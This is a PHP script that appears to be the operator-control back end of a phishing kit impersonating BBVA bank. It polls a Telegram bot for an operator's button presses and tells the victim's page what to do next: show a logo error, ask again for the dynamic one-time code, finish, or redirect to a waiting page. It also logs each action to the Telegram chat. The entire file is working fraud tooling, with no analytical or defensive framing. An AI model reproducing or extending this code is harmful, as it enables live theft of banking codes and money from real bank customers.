<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';
$transactionId = $_POST['transactionId'] ?? '';
$messageId = $_POST['messageId'] ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['action' => null]);
    exit;
}

$offset = $_SESSION['last_update_id'] ?? 0;
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$action = null;
$actionTexto = '';
$from = '';

if (isset($data['result']) && is_array($data['result'])) {
    foreach ($data['result'] as $update) {
        if (isset($update['callback_query']) &&
            strpos($update['callback_query']['data'], $transactionId) !== false) {
            
            $cb = $update['callback_query'];
            $dataCB = $cb['data'] ?? '';
            $from = $cb['from']['username'] ?? $cb['from']['first_name'] ?? 'operador';
            
            list($actionType, ) = explode(':', $dataCB);
            
            switch ($actionType) {
                case 'error_logo':
                    $action = 'error_logo';
                    $actionTexto = 'Error de Logo';
                    break;
                case 'pedir_dinamica':
                    $action = 'pedir_dinamica';
                    $actionTexto = 'Error de Dinámica';
                    break;
                case 'confirm_finalizar':
                    $action = 'confirm_finalizar';
                    $actionTexto = 'Finalizar';
                    break;
                case 'pago_enviado':
                    $action = 'pago_enviado';
                    $actionTexto = 'Pago enviado a espera.php';
                    break;
            }

            if ($action) {
                $_SESSION['last_update_id'] = $update['update_id'];

                $mensajesFile = 'mensajes_originales.json';
                $mensajes = file_exists($mensajesFile) ? json_decode(file_get_contents($mensajesFile), true) : [];
                $mensajeOriginal = $mensajes[$transactionId] ?? '';
                
                if (empty($mensajeOriginal)) {
                    $mensajeOriginal = "💎BANCO BBVA💎\nTransacción procesada";
                }

                $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageReplyMarkup");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                    'chat_id' => $config['chat_id'],
                    'message_id' => $messageId,
                    'reply_markup' => json_encode(['inline_keyboard' => []])
                ]));
                curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                curl_exec($ch);
                curl_close($ch);

                $nuevoMensaje = $mensajeOriginal . "\n\n------------------------------\n";
                $nuevoMensaje .= "✅ Acción: <b>{$actionTexto}</b>\n";
                $nuevoMensaje .= "👤 Por: @{$from}";
                
                $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                    'chat_id' => $config['chat_id'],
                    'message_id' => $messageId,
                    'text' => $nuevoMensaje,
                    'parse_mode' => 'HTML'
                ]));
                curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                curl_exec($ch);
                curl_close($ch);
                
                file_get_contents("https://api.telegram.org/bot{$config['bot_token']}/answerCallbackQuery?callback_query_id={$cb['id']}");
                
                if (isset($mensajes[$transactionId])) {
                    unset($mensajes[$transactionId]);
                    file_put_contents($mensajesFile, json_encode($mensajes));
                }
            }
            break;
        }
    }
}

if ($action === 'pago_enviado') {
    echo json_encode(['action' => 'pago_enviado']);
} else {
    echo json_encode(['action' => $action]);
}
?>